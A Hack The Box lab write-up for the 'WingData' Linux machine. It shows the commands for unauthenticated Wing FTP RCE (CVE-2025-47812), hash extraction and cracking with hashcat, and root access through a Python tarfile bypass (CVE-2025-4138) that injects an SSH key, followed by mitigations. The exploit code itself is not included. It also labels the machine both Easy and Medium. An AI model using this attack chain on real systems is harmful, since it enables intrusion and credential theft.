<p align="center">
  <img src="https://www.hackthebox.com/images/logo-htb.svg" width="150">
</p>

<h1 align="center">WingData – Hack The Box Writeup</h1>

<p align="center">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/Status-Completed-success?style=for-the-badge">
</p>

<p align="center">
  🔗 <strong>Official Completion Verification:</strong><br>
  https://labs.hackthebox.com/achievement/machine/847519/835
</p>

---

# 🧠 Machine Overview

<p align="center">
  <img src="./wingdata-banner.jpg" width="100%">
</p>

<h1 align="center">WingData – Hack The Box Write-Up</h1>

<p align="center">
  <b>Author:</b> Saurabh Tomar <br>
  <b>Platform:</b> Hack The Box <br>
  <b>OS:</b> Linux <br>
  <b>Difficulty:</b> Easy
</p>

---

# 🧠 Overview

WingData is a Medium difficulty Linux machine that demonstrates real-world exploitation techniques involving:

- Unauthenticated Remote Code Execution
- Credential extraction & hash cracking
- Sudo misconfiguration abuse
- Advanced Python tarfile filter bypass
- SSH key injection for root access

This machine focuses heavily on vulnerability chaining and understanding filesystem internals.

---

# 🗂️ Attack Surface Summary

| Phase | Technique Used |
|-------|---------------|
| Recon | Nmap Enumeration |
| Web Exploitation | CVE-2025-47812 (Wing FTP RCE) |
| Credential Access | Extract + Crack SHA256 Salted Hash |
| Lateral Movement | SSH Login |
| Privilege Escalation | CVE-2025-4138 (Python tarfile Bypass) |
| Persistence | SSH Key Injection |

---

# 🔎 1. Reconnaissance

## Port Scan

```bash
nmap -sV -sC <TARGET_IP>
```

### Open Ports

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.66
```

### Observations

- Debian-based system
- Web server running Apache
- Possible virtual hosts

---

## Virtual Host Setup

```bash
echo "<TARGET_IP> wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

---

# 🌐 2. Web Enumeration

## Main Website

`http://wingdata.htb`

Corporate landing page referencing a client portal.

## FTP Portal

`http://ftp.wingdata.htb`

Detected:

Wing FTP Server – Version 7.4.3

This version is vulnerable to an unauthenticated RCE.

---

# 💣 3. Initial Exploitation – CVE-2025-47812

## Vulnerability Summary

Improper NULL byte handling in login mechanism allows:

- Username truncation during validation
- Full payload storage inside session file
- Lua code execution via authenticated endpoints

Result: Unauthenticated RCE as `wingftp`

---

## RCE Verification

```bash
python3 exploit.py -u http://ftp.wingdata.htb -c "id"
```

Output:

```
uid=1000(wingftp)
```

Confirmed command execution.

---

# 🔐 4. Credential Extraction

Using RCE to inspect system:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

Extracted hash:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

---

## Hash Analysis

From configuration:

```
SaltingString = WingFTP
```

Hash format:

```
sha256("WingFTP" + password)
```

---

## Hash Cracking

```bash
hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

```
!#7Blushing^*Bride5
```

---

# 👤 5. User Access

```bash
ssh wacky@<TARGET_IP>
```

User flag located in:

```
~/user.txt
```

---

# 🚀 6. Privilege Escalation – CVE-2025-4138

## Sudo Permissions

```bash
sudo -l
```

Allowed command:

```
/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

---

## Vulnerability Root Cause

Python version 3.12.3 vulnerable to tarfile filter bypass.

Issue:

- `realpath()` fails when exceeding PATH_MAX
- Filter incorrectly approves path
- Kernel resolves symlink correctly
- Allows path traversal outside staging directory

Goal:

Write SSH public key into:

```
/root/.ssh/authorized_keys
```

---

# 🔑 Exploit Execution

## Generate SSH Key

```bash
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""
```

## Create Malicious Tar

```bash
python3 exploit.py \
  --preset ssh-key \
  --payload ~/.ssh/wingdata_key.pub \
  --tar-out backup_888.tar
```

## Move to Backup Directory

```bash
mv backup_888.tar /opt/backup_clients/backups/
```

## Execute Restore Script

```bash
sudo /usr/local/bin/python3 \
  /opt/backup_clients/restore_backup_clients.py \
  -b backup_888.tar \
  -r restore_win123
```

---

# 👑 Root Access

```bash
ssh -i ~/.ssh/wingdata_key root@127.0.0.1
```

Root flag:

```
/root/root.txt
```

---

# 🧾 7. Attack Chain Recap

1. Nmap → Web Enumeration
2. Wing FTP 7.4.3 → Unauthenticated RCE
3. Extract salted SHA256 hash
4. Crack password
5. SSH as user
6. Abuse sudo restore script
7. Exploit tarfile filter bypass
8. Inject SSH key into root
9. Gain root access

---

# 🛡️ 8. Mitigations

## For CVE-2025-47812
- Upgrade Wing FTP Server ≥ 7.4.4

## For CVE-2025-4138
Upgrade Python to patched versions:
- 3.9.23+
- 3.10.18+
- 3.11.13+
- 3.12.11+
- 3.13.4+

## Security Best Practices
- Never extract untrusted tar files as root
- Validate symlink entries
- Use SELinux / AppArmor
- Follow least privilege principle

---

# 🧩 Skills Demonstrated

- Advanced Enumeration
- CVE Research & Exploitation
- Hash Cracking
- Linux Privilege Escalation
- Symlink Abuse
- SSH Key Injection
- Real-world Attack Chaining

---

# 🚀 Final Thoughts

This machine reinforced the importance of methodical enumeration and how small weaknesses can escalate into full system compromise.

Continuous practice on platforms like Hack The Box significantly improves real-world penetration testing mindset.

# 📌 Notes

This write-up is for educational purposes and reflects methodology used in a controlled lab environment.

---

<p align="center">
  🔥 Happy Hacking – Saurabh Tomar
</p>
